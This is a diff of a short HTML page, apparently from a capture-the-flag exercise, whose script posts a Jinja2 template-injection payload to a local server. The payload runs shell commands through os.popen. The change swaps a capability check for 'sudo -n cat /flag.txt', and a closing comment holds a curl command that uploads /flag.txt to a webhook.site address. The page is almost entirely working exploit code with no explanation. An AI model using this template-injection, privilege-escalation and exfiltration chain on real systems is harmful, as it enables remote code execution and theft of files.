@@ -1,11 +1,11 @@
 <!doctype html>
 <meta charset="utf-8">
 <script>
-  fetch("http://127.0.0.1:4000/", {
-    method: "POST",
-    headers: {"Content-Type":"application/x-www-form-urlencoded"},
-    body: `comment={{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo $(getcap /usr/local/bin/python3 || true)').read() }}`
-  }).then(r => r.text())
-    .then(t => document.body.innerHTML = t);
+    fetch("http://127.0.0.1:4000/", {
+        method: "POST",
+        headers: {"Content-Type":"application/x-www-form-urlencoded"},
+        body: `comment={{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo $(sudo -n /bin/cat /flag.txt 2>&1)').read() }}`
+    }).then(r => r.text())
+        .then(t => document.body.innerHTML = t);
 </script>
 <!--curl -X POST -H "Content-Type: text/plain" --data-binary @/flag.txt https://webhook.site/2522fcfa-1d40-4082-a36d-02aa8457b5bc-->
